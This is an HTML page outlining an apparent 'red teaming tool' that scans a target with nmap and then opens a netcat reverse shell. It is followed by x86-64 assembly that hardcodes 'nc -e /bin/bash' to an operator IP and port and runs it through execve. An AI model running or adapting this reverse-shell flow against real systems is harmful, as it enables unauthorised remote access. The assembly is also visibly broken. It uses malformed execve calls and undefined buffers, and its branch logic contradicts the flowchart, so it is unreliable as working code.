
</head>
<body>

<h1>Red Teaming Tool Flow</h1>
    <h2>Process Overview</h2>

<div class="section-header">User Input</div>
    <table>
        <tr>
            <td>
                <ul>
                    <li><strong>Target IP</strong></li>
                    <li><strong>Operator IP</strong></li>
                    <li><strong>Port</strong></li>
                </ul>
            </td>
            <td class="arrow">▶</td>
            <td>
                <ul>
                    <li><strong>AsmScan Shell</strong></li>
                    <li>Validate Inputs</li>
                    <li>Prepare for Scan</li>
                </ul>
            </td>
            <td class="arrow">▶</td>
            <td>
                <ul>
                    <li><strong>Nmap Execution</strong></li>
                    <li>Options: <code>-sS, -sV, -p-</code></li>
                    <li>Run Full Nmap Scan</li>
                </ul>
            </td>
        </tr>
</table>

<div class="section-header">Parse Nmap Results</div>
    <table>
        <tr>
            <td colspan="5">
                <ul>
                    <li>Check for "open" services</li>
                </ul>
            </td>
        </tr>
    </table>

<div class="section-header">Service Found?</div>
    <table>
        <tr>
            <td>
                <ul>
                    <li>Yes → <strong>Reverse Shell</strong></li>
                    <li>No → <strong>Monitor Loop</strong></li>
                </ul>
            </td>
        </tr>
    </table>

 <div class="section-header">Monitor Loop</div>
    <table>
        <tr>
            <td>
                <ul>
                    <li>Retry or Scan Continuously</li>
                </ul>
            </td>
            <td class="arrow">▶</td>
            <td>
                <ul>
                    <li><strong>Reverse Shell</strong></li>
                    <li>Execute <code>nc</code> (netcat) for shell</li>
                </ul>
            </td>
        </tr>
    </table>

<div class="section-header">Exit or Retry</div>

<h2>🔧 Example Code Snippet</h2>
    <pre>
# Simple Nmap Scan Example
nmap -sS -sV -p- $TARGET_IP -oN scan_results.txt
    </pre>

</body>
</html>
<img
    src="Screenshot 2025-04-28 063837.png"
    alt="Workflow Screenshot showing flowchart steps"
    class="screenshot"
    width="800"
/>

  <p>
    The above screenshot illustrates our red-teaming tool architecture, with inputs on the left (Target IP, Operator IP, Port), 
    scanning steps (AsmScan Shell → Nmap Execution), decision logic (open services?), 
    and the reverse shell or monitor loop branches on the right. 
  </p>

</body>
</html>

---

section .data
    nmap_cmd db "nmap -sS -sV -sC -Pn -p- ", 0       ; Nmap command
    target db "192.168.1.1", 0                        ; Target IP (can change)
    reverse_shell_cmd db "nc -e /bin/bash 192.168.1.2 4444", 0 ; Reverse shell command
    result_file db "nmap_result.txt", 0                 ; File to store Nmap results

section .bss
    file_descriptor resb 1

section .text
    global _start

_start:
    ; Print message "Starting Nmap scan..."
    mov rdi, message
    call print_string

    ; Run Nmap (system call execve)
    ; execve("/bin/nmap", ["nmap", "-sS", "-sV", "-sC", "-Pn", "-p-", target], NULL)
    mov rax, 59                           ; execve syscall number (59)
    lea rdi, [nmap_cmd]                    ; Pointer to command
    lea rsi, [target]                      ; Pointer to target IP
    xor rdx, rdx                           ; No environment variables (NULL)
    syscall                                 ; Execute Nmap

    ; Check if the service is active (result is stored in nmap_result.txt)
    ; Open the result file to check for "open" ports
    mov rax, 2                              ; sys_open syscall number (2)
    lea rdi, [result_file]                  ; Pointer to filename
    mov rsi, 0                              ; Flags (read only)
    xor rdx, rdx                            ; Mode
    syscall                                 ; Open the file
    mov [file_descriptor], rax             ; Store file descriptor

    ; Read file content (check for "open" in nmap_result.txt)
    mov rax, 0                              ; sys_read syscall number (0)
    mov rdi, [file_descriptor]              ; File descriptor
    lea rsi, [file_buffer]                  ; Buffer to read file
    mov rdx, 256                            ; Read up to 256 bytes
    syscall                                 ; Read file

    ; Check for "open" in the buffer
    lea rdi, [file_buffer]                  ; Pointer to buffer
    call check_for_open                     ; Call the function to check for open ports

    ; If "open" found, go to service_active
    cmp rax, 1                              ; Check if "open" found
    je service_active

    ; Service is not active, attempt reverse shell
    mov rdi, reverse_shell_cmd
    call execute_reverse_shell

service_active:
    ; Service is active, continue monitoring (in real case, loop and monitor)
    ; This is just an example, so we'll exit here.

    ; Exit syscall (exit code 0)
    mov rax, 60                             ; sys_exit syscall number (60)
    xor rdi, rdi                            ; Exit code 0
    syscall                                 ; Exit

; Check if the string "open" exists in the buffer
check_for_open:
    ; rdi points to the buffer
    mov rbx, "open"                        ; Searching for the string "open"
    xor rcx, rcx                           ; Set rcx to 0, to loop through the buffer

.loop_check:
    mov al, byte [rdi + rcx]               ; Load byte from buffer
    cmp al, byte [rbx + rcx]               ; Compare with "open"
    jne .not_open                           ; If not equal, continue
    inc rcx
    cmp byte [rbx + rcx], 0                 ; Check if we reached the end of "open" string
    je .found_open                          ; If found, jump to success
    jmp .loop_check

.not_open:
    inc rcx
    cmp byte [rdi + rcx], 0                 ; End of buffer?
    jne .loop_check                         ; Keep searching if not

    ; No "open" found
    xor rax, rax                            ; Set return value 0 (not found)
    ret

.found_open:
    mov rax, 1                              ; Return 1 if "open" was found
    ret

; Function to execute the reverse shell command
execute_reverse_shell:
    mov rax, 59                             ; execve syscall number (59)
    lea rdi, [reverse_shell_cmd]            ; Pointer to reverse shell command
    xor rsi, rsi                            ; No arguments (NULL)
    xor rdx, rdx                            ; No environment variables
    syscall                                 ; Execute reverse shell

; Print string function
print_string:
    mov rax, 0x1                            ; sys_write syscall number (1)
    mov rdi, 0                              ; File descriptor 0 (stdout)
    mov rdx, 256                            ; Maximum number of bytes to write
    syscall                                 ; Write to stdout
    ret
